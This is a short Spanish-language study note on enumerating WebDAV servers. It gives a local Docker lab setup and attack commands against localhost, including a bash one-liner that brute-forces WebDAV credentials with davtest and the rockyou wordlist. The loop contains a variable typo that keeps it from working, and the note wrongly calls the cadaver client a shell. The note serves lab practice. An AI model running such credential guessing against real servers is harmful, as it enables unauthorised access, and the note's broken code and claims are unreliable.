> WebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite a los usuarios acceder y manipular archivos en un servidor web a través de una conexión segura.

- Cuando hablamos de enumerar un servidor WebDAV, nos referimos al proceso de recopilar información sobre los recursos disponibles en el servidor WebDAV. Los atacantes pueden utilizar herramientas de enumeración de WebDAV para buscar recursos protegidos en el servidor, como archivos de configuración, contraseñas y otros datos confidenciales. La información recopilada durante la enumeración puede ser utilizada para planificar ataques más sofisticados contra el servidor.

## Laboratorio
- `docker pull bytemark/webdav`
- ```
  docker run --restart always -v /srv/dav:/var/lib/dav -e AUTH_TYPE=Digest -e USERNAME=alice -e PASSWORD=secret1234 --publish 80:80 -d bytemark/webdav
  ```

## Ataques
- `davtest -url http://127.0.0.1 -auth admin:admin`
		- Cuando sea correcta las credenciales te aparece SUCCEED
- Para adivinar la contrasenia con una sola linea en bash
```
cat /usr/share/rockyou/rockyou.txt | while read password; do repsonse=$(davtest -url http://127.0.0.1 -auth admin:$password | grep -i succeed); if [ $response ]; then echo "la contrasenia es $password"; break; fi; done
```

- La otra herramienta me permite tener una bash
```
cadaver http://127.0.0.1
```
## Herramientas
- [[davtest]]
- [[cadaver]]